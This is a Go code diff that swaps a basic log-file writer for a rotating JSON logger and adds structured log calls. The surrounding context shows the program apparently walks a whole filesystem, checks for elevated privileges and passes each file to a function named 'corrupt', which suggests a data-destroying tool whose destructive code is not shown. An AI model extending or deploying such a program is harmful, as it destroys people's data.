@@ -1,7 +1,9 @@
 package main
 
 import (
+	"encoding/json"
 	"fmt"
+	"io"
 	"log"
 	"math/rand"
 	"os"
@@ -10,6 +12,13 @@ import (
 	"strings"
 	"sync"
 	"time"
+
+	"gopkg.in/natefinch/lumberjack.v2"
+)
+
+var (
+	loggerMu sync.Mutex
+	logger   *log.Logger
 )
 
 func isWindows() bool {
@@ -20,16 +29,50 @@ func isLinux() bool {
 	return strings.Contains(os.Getenv("OS"), "Linux")
 }
 
-func loggingSystem(message string) {
-	//create a log file
-	file, err := os.OpenFile("log.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-	if err != nil {
-		log.Fatal(err)
+func InitLogging(path string) {
+	var w io.Writer
+	if path == "" {
+		w = os.Stdout
+	} else {
+		rot := &lumberjack.Logger{
+			Filename:   path,
+			MaxSize:    10, // MB
+			MaxBackups: 3,
+			MaxAge:     14, // days
+			Compress:   true,
+		}
+		w = io.MultiWriter(os.Stdout, rot)
 	}
-	defer file.Close()
+	logger = log.New(w, "", 0)
+}
 
-	//set the logger to write to the file
-	log.SetOutput(file)
+func Log(level, message string, meta map[string]interface{}) {
+	loggerMu.Lock()
+	defer loggerMu.Unlock()
+
+	// Fallback if InitLogging wasn't called
+
+	if logger == nil {
+		InitLogging("")
+	}
+
+	entry := map[string]interface{}{
+		"level":   level,
+		"time":    time.Now().UTC().Format(time.RFC3339Nano),
+		"message": message,
+	}
+
+	if len(meta) > 0 {
+		entry["meta"] = meta
+	}
+
+	b, err := json.Marshal(entry)
+	if err != nil {
+		// best-effort fallback
+		logger.Printf(`{"level":"ERROR","time":"%s","message":"failed marshal log: %v"}`+"\n", time.Now().UTC().Format(time.RFC3339Nano), err)
+		return
+	}
+	logger.Println(string(b))
 }
 
 func corrupt(wg *sync.WaitGroup, fileChan <-chan string) {
@@ -48,11 +91,11 @@ func walkAndSendFiles(root string, fileChan chan<- string) error {
 		// remove if neccessary(i did this cause of my system)
 		if info.IsDir() {
 			if runtime.GOOS == "linux" && strings.Contains(path, ".wine") {
-				loggingSystem("passed .wine folder")
+				Log("INFO", "passed .wine folder", map[string]interface{}{"path": path})
 				return filepath.SkipDir
 			}
 			if runtime.GOOS == "linux" && strings.Contains(path, ".var") {
-				loggingSystem("passed .var folder")
+				Log("INFO", "passed .var folder", map[string]interface{}{"path": path})
 				return filepath.SkipDir
 			}
 			return nil // skip folders
@@ -138,7 +181,12 @@ func defaultRoot() string {
 }
 
 func main() {
+	InitLogging("log.jsonl") // or "" to only print to stdout
+
 	rootDir := defaultRoot()
+
+	Log("INFO", "starting walk", nil)
+
 	fileChan := make(chan string, 100)
 
 	//check elevation
